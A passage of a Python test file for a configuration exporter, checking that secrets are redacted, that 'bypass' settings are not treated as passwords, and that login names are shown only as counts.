                                         "forwarding_profiles": [{"id": 1, "name": "F", "raw": raw}], "pac_files": []}, {})
    # Assert
    assert ce.is_secret(field) and not [x for x in lines if CANARY in x]
    assert not [t for t in _cell_texts(data) if CANARY in t]


@pytest.mark.parametrize("field", ["appBypass", "bypassApps", "enableApplicationBasedBypass", "addAppBypassToVPNGateway"])
def test_a_bypass_setting_is_not_mistaken_for_a_password(field):
    """ASVS V8.3.4 · CWE-200: the word filter keeps bypass settings (boundary: 'pass' inside 'bypass' is not the word)."""
    assert not ce.is_secret(field) and ce.settings_lines({field: "on"}) == [f"{ce._label(field)}: on"]


def test_a_login_name_in_a_profile_is_counted_never_named():
    """ASVS V8.3.4 · CWE-359 · WSTG-INFO-05: zpaAuthUsername (a person's login) shows as a count, never the name."""
    lines = ce.settings_lines({"zpaAuthUsername": "jane.doe@acme.example"})
    assert lines == ["Zpa auth username: 1 person"]
